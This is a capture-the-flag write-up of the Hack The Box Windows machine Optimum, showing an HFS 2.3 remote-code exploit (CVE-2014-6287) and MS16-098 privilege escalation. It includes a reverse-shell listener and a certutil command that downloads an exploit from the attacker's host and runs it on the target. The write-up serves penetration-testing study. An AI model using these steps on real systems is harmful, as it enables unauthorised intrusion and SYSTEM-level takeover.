# Optimum 

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Optimum)  [2](https://app.hackthebox.com/machines/Optimum)

**Machine ip:** 10.10.10.8

![Optimum](https://github.com/h4md153v63n/CTFs/assets/5091265/f0fe7004-231f-495f-b3b2-8af6d4e6d81a)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.8 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.8 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6bd17850-1383-4bb9-9363-f840a535bbc5)


## Enumeration
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b8a57ae-f7cc-4fee-a4bb-d9d8ae1f2ddb)


## Exploitation & Gaining Access

### CVE-2014-6287 [1](https://www.exploit-db.com/exploits/39161) [2](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit#id-4a01)

```
searchsploit hfs 2.3

searchsploit -m 39161
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/160c6e02-5cc4-4c84-aa44-b51481749738)

Change ip addres and port number:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fbbb8068-00c8-4bda-8ae5-9b062ae8d92a)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a62cd8b5-3931-4863-9e43-c9bd8ca44602)

```
# On the kali attack vm:
cp /usr/share/windows-binaries/nc.exe .

# On the kali attack vm - different terminal:
sudo python3 -m http.server 80

# On the kali attack vm - different terminal you will get the revershell:
nc -nlvp 4444

# On the kali attack vm - different terminal:
python3 39161.py 10.10.10.8 80

python3 39161.py 10.10.10.8 80

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/297d6042-a32c-4afc-87ac-a4502acc2fc2)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b3ad525-c717-4f8c-a61c-6bf6381ab8f2)


## Privilege Escalation

### Method 1: MS16-098 / Kernel [1](https://www.exploit-db.com/exploits/41020) [2](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe) [3](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit#id-4f80)

**Alternative** links [1](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098) [2](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe)

```
# On the kali attack vm:
python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2024-04-08-mssb.xls --systeminfo systeminfo.txt

# On the target machine:
systeminfo
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/32eb7f0c-5bb7-41b6-8d33-dfb5f11445a1)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a43d3006-c5f2-4141-9446-154e5c8169ea)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c48e9398-e5c2-4853-9bd8-1b9d0596b083)

```
# On the kali attack vm:
searchsploit 41020

searchsploit -m 41020

wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe

sudo python3 -m http.server

# On the target machine:
certutil.exe -urlcache -split -f "http://10.10.14.24:8000/41020.exe" 41020.exe

41020.exe
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d51b7047-a7a0-4610-90a0-f28a43dbaa68)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5cbb257e-323c-4c60-9ba7-7cd637287e51)

Get the shell as **nt authority\system**, and read the root flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4616bddf-9e5c-47fc-ad79-1f42c84449c8)


# References & Alternatives
+ https://vvmlist.github.io/#Optimum
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit
  + https://medium.com/@toneemarqus/optimum-htb-manual-walkthrough-2023-tonee-e2a53fb59b1d
+ https://0xdf.gitlab.io/2021/03/17/htb-optimum.html


## CVE Scripting
+ **CVE-2014-6287:**
  + https://www.exploit-db.com/exploits/39161
  + https://nvd.nist.gov/vuln/detail/CVE-2014-6287
+ **MS16-098 / Kernel:**
  + https://www.exploit-db.com/exploits/41020
    + https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
 + https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098
   + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe


## Tools
+ /usr/share/windows-resources/binaries/
+ **Windows Exploit Suggester:** https://github.com/AonCyberLabs/Windows-Exploit-Suggester


## Technical Knowledge
+ x


## Problems Solution
+ **SyntaxError: (unicode error) 'unicodeescape' codec can't decode bytes in position 2-3: truncated \UXXXXXXXX escape:**
  + https://youtu.be/rNmF991BSTE?t=40
  + https://www.geeksforgeeks.org/how-to-fix-syntaxerror-unicode-error-unicodeescape-codec-cant-decode-bytes/
  + https://community.alteryx.com/t5/Alteryx-Designer-Desktop-Discussions/Error-unicodeescape-codec-can-t-decode-bytes/td-p/427540
+ **SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?:**
  + https://www.w3docs.com/snippets/python/what-does-syntaxerror-missing-parentheses-in-call-to-print-mean-in-python.html
  + https://stackoverflow.com/questions/25445439/what-does-syntaxerror-missing-parentheses-in-call-to-print-mean-in-python
+ **ModuleNotFoundError: No module named 'urllib2':**
  + https://www.easytweaks.com/module-not-found-urllib2/
  + https://youtu.be/jfD_9DoWGlI?t=63
  + https://blog.finxter.com/fix-import-error-no-module-named-urllib2-python/
+ **ERROR: Could not find a version that satisfies the requirement urllib (from versions: none):**
  + https://github.com/ThomasTJdev/python_gdork_sqli/issues/1
+ **xlrd.biffh.XLRDError: Excel xlsx file; not supported:**
  + https://stackoverflow.com/questions/65254535/xlrd-biffh-xlrderror-excel-xlsx-file-not-supported


## For More
- x
